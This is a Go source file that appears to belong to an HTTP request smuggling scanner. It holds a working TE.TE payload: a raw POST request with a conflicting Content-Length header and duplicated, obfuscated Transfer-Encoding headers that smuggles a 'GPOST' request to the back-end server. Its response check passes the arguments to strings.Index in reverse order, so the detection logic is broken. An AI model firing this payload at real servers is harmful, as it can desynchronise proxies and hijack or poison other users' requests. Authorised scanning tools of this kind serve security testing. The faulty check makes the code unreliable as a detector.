package Smuggling

import (
	"strings"
)

var TeTePayload = []string{`POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`}

func init() {
	for n, x := range TeTePayload {
		x = strings.ReplaceAll(x, "\n", "\r\n")
		TeTePayload[n] = x
	}
}

type TeTe struct {
}

func (r *TeTe) CheckResponse(body string) bool {
	return -1 < strings.Index("Unrecognized method GPOST", body)
}
func (r *TeTe) GetTimes() int {
	return 1
}
func (r *TeTe) GetPayloads() *[]string {
	return &TeTePayload
}

func (r *TeTe) GetVulType() string {
	return "TE-TE"
}
